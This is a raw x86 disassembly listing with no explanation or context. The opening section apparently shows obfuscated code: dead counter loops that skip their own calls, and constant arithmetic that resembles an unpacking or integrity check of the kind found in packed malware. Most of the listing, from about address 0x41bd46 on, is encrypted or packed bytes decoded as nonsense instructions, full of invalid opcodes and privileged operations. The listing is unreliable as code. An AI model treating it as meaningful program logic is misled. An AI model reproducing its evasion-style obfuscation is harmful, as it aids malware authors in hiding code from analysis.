  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42a9e7
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42a9eb
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42a9ef
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9bb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9bf
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9c3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	add    cl,cl
  41bd54:	stos   DWORD PTR es:[edi],eax
  41bd55:	pop    edx
  41bd56:	daa    
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0x2d
  41bd5f:	(bad)  
  41bd60:	push   0x4e
  41bd62:	int3   
  41bd63:	rcr    BYTE PTR [edx-0x12],0x3d
  41bd67:	jns    0x41bd1d
  41bd69:	lock test BYTE PTR [esi],cl
  41bd6c:	int3   
  41bd6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd6e:	push   es
  41bd6f:	int    0xdc
  41bd71:	push   ebp
  41bd72:	or     bl,BYTE PTR [edx]
  41bd74:	jbe    0x41bd01
  41bd76:	and    al,0xa3
  41bd78:	dec    ecx
  41bd79:	sbb    dl,BYTE PTR [edi+esi*2]
  41bd7c:	repnz cmp ah,BYTE PTR [ebp-0x2c72760b]
  41bd83:	ficom  DWORD PTR [edx-0x5437574]
  41bd89:	repz sbb BYTE PTR [edi+0x3c8c3086],cl
  41bd90:	mov    ebp,0x66ab4ba2
  41bd95:	int    0x97
  41bd97:	adc    esi,DWORD PTR [edx+0x267dd83b]
  41bd9d:	ss out dx,eax
  41bd9f:	dec    ecx
  41bda0:	push   edx
  41bda1:	xor    bh,0xb5
  41bda4:	adc    DWORD PTR fs:[edx-0x71],0xbc77c16f
  41bdac:	dec    ecx
  41bdad:	pop    ss
  41bdae:	mov    ecx,DWORD PTR [edi+eiz*8+0x30]
  41bdb2:	cmp    al,dl
  41bdb4:	xchg   si,ax
  41bdb6:	mov    ebx,0x6bd2ac3d
  41bdbb:	out    dx,al
  41bdbc:	stos   BYTE PTR es:[edi],al
  41bdbd:	test   eax,0x61767ba2
  41bdc2:	fstp   TBYTE PTR [esp+esi*2]
  41bdc5:	test   BYTE PTR [ecx],bh
  41bdc7:	inc    esi
  41bdc8:	aaa    
  41bdc9:	push   es
  41bdca:	push   cs
  41bdcb:	mov    bh,0x38
  41bdcd:	icebp  
  41bdce:	jp     0x41be2c
  41bdd0:	outs   dx,DWORD PTR ds:[esi]
  41bdd1:	add    edi,edx
  41bdd3:	fld    TBYTE PTR [ebx]
  41bdd5:	dec    ebx
  41bdd6:	popa   
  41bdd7:	sub    eax,0x4adccee1
  41bddc:	or     al,0xde
  41bdde:	dec    ecx
  41bddf:	arpl   WORD PTR [eax],sp
  41bde1:	ja     0x41be41
  41bde3:	mov    ds:0x570a3c55,al
  41bde8:	lods   eax,DWORD PTR ds:[esi]
  41bde9:	jne    0x41bdfc
  41bdeb:	pop    esi
  41bdec:	and    eax,0xa0332bf6
  41bdf1:	mov    esp,0xb1e2ebdf
  41bdf6:	retf   0x3858
  41bdf9:	mov    al,BYTE PTR [ebx-0x3c]
  41bdfc:	mov    esp,0x3d8bc346
  41be01:	inc    eax
  41be02:	mov    esi,0x2069df76
  41be07:	adc    eax,0x75278b77
  41be0c:	out    dx,eax
  41be0d:	enter  0xe74f,0xe0
  41be11:	(bad)  
  41be12:	pusha  
  41be13:	inc    eax
  41be14:	sahf   
  41be15:	cmp    al,0x13
  41be17:	out    0x99,al
  41be19:	popa   
  41be1a:	stos   BYTE PTR es:[edi],al
  41be1b:	in     al,0x2a
  41be1d:	imul   ebx,DWORD PTR [edx+eax*8],0x131298af
  41be24:	dec    eax
  41be25:	es jmp 0xa8db:0x9a53870c
  41be2d:	in     al,0x2c
  41be2f:	sbb    al,0x61
  41be31:	pop    esp
  41be32:	cs mov bh,0xf7
  41be35:	pop    esi
  41be36:	add    al,0x66
  41be38:	cmp    eax,edi
  41be3a:	jb     0x41be38
  41be3c:	mov    ebp,0x47101a10
  41be41:	xor    al,0x6e
  41be43:	shr    BYTE PTR [esi+0x503f109a],cl
  41be49:	jnp    0x41bec4
  41be4b:	xchg   esp,eax
  41be4c:	sbb    bh,al
  41be4e:	sub    eax,0xbd816f49
  41be53:	mov    esp,0xb2b3cd91
  41be58:	ja     0x41be3e
  41be5a:	add    BYTE PTR es:[ebp-0x29eb086b],al
  41be61:	inc    eax
  41be62:	jmp    0x32d4b791
  41be67:	mov    edx,0x26c61383
  41be6c:	push   ebp
  41be6d:	ins    BYTE PTR es:[edi],dx
  41be6e:	push   ebp
  41be6f:	xor    BYTE PTR [edi-0x754aeb20],ah
  41be75:	mov    dh,al
  41be77:	jmp    0x41be8d
  41be79:	mov    gs,WORD PTR [ebx-0x7b50f49a]
  41be7f:	fisttp WORD PTR [edi-0x5d]
  41be82:	and    BYTE PTR [ebx+0x7bec4e55],al
  41be88:	mov    WORD PTR [ebp-0x10],fs
  41be8b:	rol    DWORD PTR [ebx+ebp*1],cl
  41be8e:	jbe    0x41be19
  41be90:	inc    ecx
  41be91:	jmpw   0x267b
  41be95:	pop    es
  41be96:	loopne 0x41beea
  41be98:	push   esp
  41be99:	(bad)  
  41be9a:	adc    al,0xb9
  41be9c:	jle    0x41bed6
  41be9e:	in     eax,dx
  41be9f:	outs   dx,DWORD PTR ds:[si]
  41bea1:	in     al,dx
  41bea2:	mov    ah,0x3e
  41bea4:	mov    dl,0xd7
  41bea6:	stos   BYTE PTR es:[edi],al
  41bea7:	jmp    0x41bebf
  41bea9:	jle    0x41be55
  41beab:	mov    ds:0xda1c26e4,eax
  41beb0:	adc    eax,0x630f199c
  41beb5:	(bad)  
  41beb6:	mov    esi,0xc09a9bb
  41bebb:	dec    ebx
  41bebc:	loope  0x41bece
  41bebe:	fild   DWORD PTR [edi]
  41bec0:	and    eax,0xb6a72605
  41bec5:	inc    ebx
  41bec6:	pop    edi
  41bec7:	arpl   WORD PTR ds:0x80d85030,ax
  41becd:	shl    DWORD PTR [edi],cl
  41becf:	call   FWORD PTR [ecx+edi*8-0x462f9d9a]
  41bed6:	and    eax,0x8b7355d4
  41bedb:	cmp    eax,0x20bb53a5
  41bee0:	cmp    DWORD PTR [ebx-0x6284646d],0x14
  41bee7:	mov    ch,ah
  41bee9:	mov    dl,BYTE PTR [esi+edx*8]
  41beec:	dec    edi
  41beed:	rol    BYTE PTR [eax-0x7d],cl
  41bef0:	test   edx,edi
  41bef2:	lods   al,BYTE PTR ds:[esi]
  41bef3:	lods   eax,DWORD PTR ds:[esi]
  41bef4:	pop    ds
  41bef5:	test   al,0x29
  41bef7:	(bad)  
  41bef8:	ins    DWORD PTR es:[edi],dx
  41bef9:	hlt    
  41befa:	arpl   dx,cx
  41befc:	mov    ebx,0x1813cf63
  41bf01:	xchg   DWORD PTR [ecx+0x65],ecx
  41bf04:	jb     0x41bef7
  41bf06:	sbb    ah,BYTE PTR [edi-0x4f]
  41bf09:	push   ebp
  41bf0a:	arpl   WORD PTR [eax],dx
  41bf0c:	jnp    0x41bf5e
  41bf0e:	clc    
  41bf0f:	mov    ebx,0x975d89b8
  41bf14:	xlat   BYTE PTR ds:[ebx]
  41bf15:	clc    
  41bf16:	sbb    al,0xfc
  41bf18:	test   dl,dl
  41bf1a:	sahf   
  41bf1b:	dec    edx
  41bf1c:	out    dx,al
  41bf1d:	mov    ecx,0x39140bf9
  41bf22:	shl    DWORD PTR [ebx-0x5a],cl
  41bf25:	sbb    eax,0x6dc6e5b8
  41bf2a:	fwait
  41bf2b:	pop    ecx
  41bf2c:	dec    ecx
  41bf2d:	xor    ecx,edi
  41bf2f:	ror    DWORD PTR [edi+edx*4-0x5f64aa4c],cl
  41bf36:	(bad)  
  41bf37:	mov    ebp,0x397a4db9
  41bf3c:	fs dec eax
  41bf3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf3f:	pop    ebp
  41bf40:	ins    DWORD PTR es:[edi],dx
  41bf41:	rol    DWORD PTR [ebp+0x4e6eb6be],0x4b
  41bf48:	jo     0x41bee8
  41bf4a:	les    esp,FWORD PTR [edi-0x2933ccef]
  41bf50:	mov    edx,0x36e2d850
  41bf55:	xchg   ecx,eax
  41bf56:	mov    gs,WORD PTR [edx]
  41bf58:	mov    bl,0x53
  41bf5a:	mov    ebx,0xb62d27bd
  41bf5f:	add    DWORD PTR [esp+edx*2],0xffffffb1
  41bf63:	fcmove st,st(0)
  41bf65:	test   bh,0x42
  41bf68:	test   al,0x15
  41bf6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6b:	ret    
  41bf6c:	ins    BYTE PTR es:[edi],dx
  41bf6d:	xchg   ebx,eax
  41bf6e:	mov    ebx,0xe74928cd
  41bf73:	xor    al,0xe
  41bf75:	inc    edx
  41bf76:	stc    
  41bf77:	push   esi
  41bf78:	int    0x63
  41bf7a:	pop    ebx
  41bf7b:	fnstenv [edi+0x3b]
  41bf7e:	out    0x63,al
  41bf80:	mov    ecx,DWORD PTR [ebp+0x77b911ae]
  41bf86:	fmul   QWORD PTR [eax-0x51f9f887]
  41bf8c:	adc    eax,0x67e9cc56
  41bf91:	dec    ecx
  41bf92:	dec    edi
  41bf93:	fs cli 
  41bf95:	and    BYTE PTR [ebp+0x67],0x2b
  41bf99:	test   DWORD PTR [esi],ebp
  41bf9b:	loop   0x41bf94
  41bf9d:	xlat   BYTE PTR ds:[ebx]
  41bf9e:	pop    edi
  41bf9f:	iret   
  41bfa0:	(bad)  
  41bfa1:	or     edx,DWORD PTR ds:0xe927cc01
  41bfa7:	lods   eax,DWORD PTR ds:[esi]
  41bfa8:	add    eax,0x924cc232
  41bfad:	push   ebx
  41bfae:	jnp    0x41c012
  41bfb0:	pusha  
  41bfb1:	push   ds
  41bfb2:	in     al,dx
  41bfb3:	pop    eax
  41bfb4:	cmc    
  41bfb5:	into   
  41bfb6:	fs dec eax
  41bfb8:	mov    bh,0x1
  41bfba:	test   BYTE PTR [esi+0x65e0b75b],dh
  41bfc0:	or     eax,0xaa8851b7
  41bfc5:	(bad)  
  41bfc6:	fadd   DWORD PTR [ebp-0x7b]
  41bfc9:	shl    ah,1
  41bfcb:	enter  0xe3d1,0xa9
  41bfcf:	fcomp  DWORD PTR [ebx+ecx*2+0x12e3f944]
  41bfd6:	dec    esi
  41bfd7:	inc    ecx
  41bfd8:	imul   esp,DWORD PTR [ebx+0x7b],0xffffffbf
  41bfdc:	pusha  
  41bfdd:	iret   
  41bfde:	sub    al,0xa
  41bfe0:	fidiv  WORD PTR [ebp-0x40]
  41bfe3:	fs aaa 
  41bfe5:	cmp    DWORD PTR [ebx+0x5e7a4659],esi
  41bfeb:	dec    eax
  41bfec:	aad    0x1c
  41bfee:	(bad)  [eax]
  41bff0:	jecxz  0x41bf9d
  41bff2:	mov    ss,WORD PTR [ebp+0x2e]
  41bff5:	call   DWORD PTR [edi+0x39e43e57]
  41bffb:	sbb    al,0xdd
  41bffd:	or     eax,DWORD PTR [ebx]
  41bfff:	daa    
  41c000:	(bad)  [ecx+ebp*1]
  41c003:	outs   dx,BYTE PTR ds:[esi]
  41c004:	mov    ecx,0x454c5f1d
  41c009:	xchg   edi,eax
  41c00a:	mov    ah,BYTE PTR [edi-0x69]
  41c00d:	or     eax,0x224e019b
  41c012:	dec    esp
  41c013:	call   0xbc3c0995
  41c018:	mov    DWORD PTR [edi+0x27],esi
  41c01b:	ficom  WORD PTR [ecx+0xa502537]
  41c021:	mov    bh,0xa6
  41c023:	xchg   esi,eax
  41c024:	mov    ecx,0xbc35b7db
  41c029:	sbb    al,ch
  41c02b:	jg     0x41bff5
  41c02d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c02e:	xor    eax,0x3459fe52
  41c033:	loopne 0x41c069
  41c035:	je     0x41c083
  41c037:	es jg  0x41bff3
  41c03a:	push   esp
  41c03b:	mov    eax,0xd267cd12
  41c040:	jl     0x41c09e
  41c042:	xchg   BYTE PTR [edi+0xde897e8],bl
  41c048:	jl     0x41c08c
  41c04a:	and    dh,BYTE PTR [edx+eiz*1+0x1d0a00d7]
  41c051:	xchg   DWORD PTR [eax],esp
  41c053:	cld    
  41c054:	test   bl,ch
  41c056:	test   BYTE PTR [edi],dl
  41c058:	call   0xe04c6220
  41c05d:	hlt    
  41c05e:	push   ss
  41c05f:	retf   0x1b82
  41c062:	cmp    DWORD PTR [edi+0x76],0xffffffdc
  41c066:	lea    ecx,[edi+0x68]
  41c069:	imul   edi,DWORD PTR [ebx-0x6852ff68],0x1b
  41c070:	jns    0x41c04d
  41c072:	fstp   DWORD PTR ds:0x6c22551
  41c078:	(bad)  
  41c079:	ds aam 0x6e
  41c07c:	iret   
  41c07d:	lock mov ebp,0x2b80c57c
  41c083:	aaa    
  41c084:	jg     0x41c0e7
  41c086:	push   esp
  41c087:	setp   BYTE PTR es:[esi-0xc]
  41c08c:	inc    ebp
  41c08d:	test   al,0x91
  41c08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c090:	sbb    eax,0x7f5ac7d9
  41c095:	mov    edx,0x1e8a16ed
  41c09a:	hlt    
  41c09b:	jl     0x41c0dd
  41c09d:	fucom  st(7)
  41c09f:	ror    DWORD PTR ds:[ebx+0x5b4de60f],1
  41c0a6:	lds    eax,FWORD PTR [ebx]
  41c0a8:	add    DWORD PTR ds:0x3484018c,edi
  41c0ae:	aaa    
  41c0af:	imul   ebx,DWORD PTR [edi+0x52],0xb04d85f8
  41c0b6:	jae    0x41c07c
  41c0b8:	pop    edx
  41c0b9:	xchg   esp,eax
  41c0ba:	in     eax,0x79
  41c0bc:	mov    al,0xca
  41c0be:	js     0x41c0d4
  41c0c0:	or     BYTE PTR [eax],ch
  41c0c2:	aaa    
  41c0c3:	test   DWORD PTR [edi],edx
  41c0c5:	scas   eax,DWORD PTR es:[edi]
  41c0c6:	shr    DWORD PTR [eax-0x48],cl
  41c0c9:	push   es
  41c0ca:	mov    ds:0x84518185,eax
  41c0cf:	jns    0x41c0cc
  41c0d1:	imul   ebx,eax,0x59594b9b
  41c0d7:	xchg   ecx,eax
  41c0d8:	push   cs
  41c0d9:	jmp    0x41c074
  41c0db:	xchg   ebp,eax
  41c0dc:	mov    ecx,0x28084d6f
  41c0e1:	aas    
  41c0e2:	mov    ebp,0x6567ed34
  41c0e7:	loop   0x41c11b
  41c0e9:	cmp    BYTE PTR [ecx-0x65fd1835],ah
  41c0ef:	jmp    0xfba2f786
  41c0f4:	shl    edx,1
  41c0f6:	test   al,0xbb
  41c0f8:	std    
  41c0f9:	push   es
  41c0fa:	jl     0x41c0e5
  41c0fc:	or     eax,DWORD PTR [edi-0x95e2b5d]
  41c102:	pop    eax
  41c103:	fmul   DWORD PTR ds:[edx-0x10]
  41c107:	mov    ds:0x32465f3a,eax
  41c10c:	fst    DWORD PTR [edx+0xfc6ceb4]
  41c113:	jb     0x41c171
  41c115:	inc    esi
  41c116:	sar    ebp,1
  41c118:	jo     0x41c0e2
  41c11a:	mov    eax,0x9ac0dd2
  41c11f:	call   0xb6e3:0x8d692172
  41c126:	sbb    al,0xb1
  41c128:	lods   al,BYTE PTR ds:[esi]
  41c129:	popa   
  41c12a:	dec    esi
  41c12b:	sbb    al,0x36
  41c12d:	dec    ecx
  41c12e:	mov    dl,BYTE PTR [edx-0x6f]
  41c131:	adc    ebx,esi
  41c133:	sub    al,BYTE PTR [ebp-0x76]
  41c136:	dec    edx
  41c137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c138:	add    DWORD PTR [ebp+0x7d],eax
  41c13b:	lods   eax,DWORD PTR ds:[esi]
  41c13c:	aas    
  41c13d:	mov    ss,esp
  41c13f:	jmp    0xe9e5aa7b
  41c144:	test   al,0xdf
  41c146:	and    bh,ah
  41c148:	jl     0x41c185
  41c14a:	mov    cl,0xa4
  41c14c:	mov    gs,WORD PTR [edx]
  41c14e:	mov    eax,ds:0x6644c894
  41c153:	jb     0x41c116
  41c155:	(bad)  
  41c156:	aad    0x42
  41c158:	fwait
  41c159:	cld    
  41c15a:	mov    ebp,ebx
  41c15c:	adc    eax,DWORD PTR [eax]
  41c15e:	cmp    DWORD PTR ds:0xb13b0e80,eax
  41c164:	cs test eax,0x90148c8f
  41c16a:	push   es
  41c16b:	sahf   
  41c16c:	fiadd  DWORD PTR [ebp+0x2d557c21]
  41c172:	shr    BYTE PTR [ebx+0x7c95107],cl
  41c178:	mov    esi,0xc0500aab
  41c17d:	rol    bh,cl
  41c17f:	je     0x41c1a2
  41c181:	das    
  41c182:	xor    BYTE PTR [esi],dh
  41c184:	aam    0xf5
  41c186:	adc    dl,BYTE PTR [edi]
  41c188:	ret    
  41c189:	mov    eax,0xd46ef27
  41c18e:	dec    ebx
  41c18f:	push   ss
  41c190:	outs   dx,DWORD PTR ds:[esi]
  41c191:	addr16 push 0x53966c29
  41c197:	add    esp,DWORD PTR [esi+0x59]
  41c19a:	xor    ebx,ecx
  41c19c:	out    dx,eax
  41c19d:	loopne 0x41c1b9
  41c19f:	mov    ecx,DWORD PTR [ebx+0x4d]
  41c1a2:	jp     0x41c1ed
  41c1a4:	inc    esp
  41c1a5:	mov    dl,0x6a
  41c1a7:	les    ebx,FWORD PTR [eax]
  41c1a9:	push   ebx
  41c1aa:	dec    esp
  41c1ab:	pop    es
  41c1ac:	xor    eax,0x6d6c6eab
  41c1b1:	xchg   esp,eax
  41c1b2:	mov    ss,WORD PTR [ecx-0x21759aa0]
  41c1b8:	stc    
  41c1b9:	out    0x63,eax
  41c1bb:	scas   al,BYTE PTR es:[edi]
  41c1bc:	fmul   DWORD PTR [ebx+eax*2]
  41c1bf:	mov    ecx,0x77d29eda
  41c1c4:	shl    BYTE PTR ds:0xc997d70c,1
  41c1ca:	cmp    dl,BYTE PTR [eax]
  41c1cc:	adc    al,0xae
  41c1ce:	bound  ecx,QWORD PTR [esi-0x22]
  41c1d1:	je     0x41c180
  41c1d3:	cld    
  41c1d4:	push   ds
  41c1d5:	inc    ebx
  41c1d6:	dec    esi
  41c1d7:	loop   0x41c16e
  41c1d9:	fwait
  41c1da:	out    dx,al
  41c1db:	mov    esp,0x396e0942
  41c1e0:	xor    bh,BYTE PTR [ecx]
  41c1e2:	lods   eax,DWORD PTR ds:[esi]
  41c1e3:	fdivr  DWORD PTR [esi+0x1caf2153]
  41c1e9:	push   ss
  41c1ea:	cmp    al,0x68
  41c1ec:	push   esi
  41c1ed:	push   0xcaf2e761
  41c1f2:	sub    ebx,DWORD PTR [eax+0x57b08fce]
  41c1f8:	jo     0x41c218
  41c1fa:	mov    ebp,0xa95ad1b7
  41c1ff:	push   esp
  41c200:	scas   al,BYTE PTR es:[edi]
  41c201:	mov    edx,0xc36bd95a
  41c206:	cli    
  41c207:	inc    eax
  41c208:	fadd   DWORD PTR cs:[esi+0x26a81087]
  41c20f:	or     al,0x22
  41c211:	cli    
  41c212:	cld    
  41c213:	sbb    DWORD PTR [ecx],ebp
  41c215:	out    0x11,al
  41c217:	out    0x79,al
  41c219:	bnd jne 0x41c1d8
  41c21c:	lock and BYTE PTR [ebx+0x28121ea6],dh
  41c223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c224:	ins    BYTE PTR es:[edi],dx
  41c225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c226:	in     eax,0xc9
  41c228:	push   esi
  41c229:	or     bh,0xdd
  41c22c:	fisub  WORD PTR [esi-0x2676248]
  41c232:	or     eax,edi
  41c234:	fiadd  WORD PTR [ecx]
  41c236:	jg     0x41c298
  41c238:	mov    BYTE PTR ds:0x6d01355b,0xad
  41c23f:	push   edx
  41c240:	(bad)  
  41c241:	icebp  
  41c242:	mul    ebx
  41c244:	xchg   esi,eax
  41c245:	retf   0xb22c
  41c248:	lods   eax,DWORD PTR ds:[esi]
  41c249:	test   BYTE PTR [esi-0x160c05de],bh
  41c24f:	push   edx
  41c250:	sub    al,BYTE PTR [ebx]
  41c252:	cmp    al,0x6e
  41c254:	sbb    ah,BYTE PTR [esi]
  41c256:	add    eax,0xc9b16095
  41c25b:	and    BYTE PTR [edi-0x61],bh
  41c25e:	mov    DWORD PTR [ecx],edx
  41c260:	pop    ecx
  41c262:	inc    ebx
  41c263:	cmp    eax,0xbb0b6d8f
  41c268:	pop    edx
  41c269:	call   0x10da:0x7138a48a
  41c270:	jb     0x41c1fe
  41c272:	dec    esi
  41c273:	pop    esp
  41c274:	int3   
  41c275:	sub    bh,BYTE PTR [edi]
  41c277:	rol    DWORD PTR [esi+0x64],1
  41c27a:	stos   DWORD PTR es:[edi],eax
  41c27b:	pop    es
  41c27c:	jecxz  0x41c278
  41c27e:	je     0x41c227
  41c280:	fistp  QWORD PTR [eax+0x247219de]
  41c286:	dec    ebx
  41c287:	mov    ebp,0xa598326d
  41c28c:	cmp    DWORD PTR [ebx-0x222a51ad],ebx
  41c292:	cmp    eax,0xb4028ed9
  41c297:	test   DWORD PTR [edx+0x2a86c193],esi
  41c29d:	mov    esp,0xa2ec3db9
  41c2a2:	ss pop eax
  41c2a4:	pop    ds
  41c2a5:	scas   eax,DWORD PTR es:[edi]
  41c2a6:	lods   eax,DWORD PTR ds:[esi]
  41c2a7:	stos   DWORD PTR es:[edi],eax
  41c2a8:	loopne 0x41c28f
  41c2aa:	pop    edi
  41c2ab:	jp     0x41c248
  41c2ad:	dec    eax
  41c2ae:	ret    
  41c2af:	cmp    al,0xe0
  41c2b2:	aaa    
  41c2b3:	fld    DWORD PTR [eax]
  41c2b5:	je     0x41c31f
  41c2b7:	cld    
  41c2b8:	pop    ds
  41c2b9:	adc    DWORD PTR [ecx+ecx*4-0x67],eax
  41c2bd:	mov    ecx,0x23af0a95
  41c2c2:	jge    0x41c2ed
  41c2c4:	fmul   DWORD PTR ds:0xbd16d40f
  41c2ca:	sub    BYTE PTR [esp+edx*1+0x1003d754],ch
  41c2d1:	sub    BYTE PTR [eax],dl
  41c2d3:	sub    eax,edi
  41c2d5:	imul   ecx,DWORD PTR [esi+ecx*2+0x2ee91e79],0x70
  41c2dd:	in     eax,dx
  41c2de:	push   eax
  41c2df:	into   
  41c2e0:	add    al,al
  41c2e2:	xchg   BYTE PTR [esi-0x2a6d4138],dl
  41c2e8:	fld    QWORD PTR [edx]
  41c2ea:	pop    edi
  41c2eb:	cmp    BYTE PTR [esi],ah
  41c2ed:	push   eax
  41c2ee:	cld    
  41c2ef:	(bad)  [edi]
  41c2f1:	test   eax,0x373d9dae
  41c2f6:	mov    al,0xe8
  41c2f8:	pop    edi
  41c2f9:	and    al,0x78
  41c2fb:	pop    es
  41c2fc:	cmp    ah,BYTE PTR [eax+ebp*8+0x44e6b5d6]
  41c303:	imul   ebx,DWORD PTR [eax+0x2e],0x44
  41c307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c308:	and    al,0x56
  41c30a:	and    BYTE PTR [esi-0x110e4091],cl
  41c310:	bound  edx,QWORD PTR ds:0x43826c1b
  41c316:	xor    BYTE PTR [edi+0x7660e3e6],cl
  41c31c:	lea    edx,[eax-0x4dfd31a0]
  41c322:	sub    eax,0x8624907d
  41c327:	mov    dl,0x14
  41c329:	jbe    0x41c2db
  41c32b:	xchg   edi,eax
  41c32c:	mov    cl,0x20
  41c32e:	adc    DWORD PTR [esi],eax
  41c330:	pop    edi
  41c331:	push   eax
  41c332:	aam    0x24
  41c334:	sub    ebp,ecx
  41c336:	jl     0x41c3b5
  41c338:	mov    eax,DWORD PTR [ecx]
  41c33a:	pusha  
  41c33b:	scas   eax,DWORD PTR es:[edi]
  41c33c:	loop   0x41c39b
  41c33e:	mov    dl,0xc9
  41c340:	test   bh,dh
  41c342:	sbb    bl,BYTE PTR [edi+0x12ad3d54]
  41c348:	retf   
  41c349:	cmp    al,ch
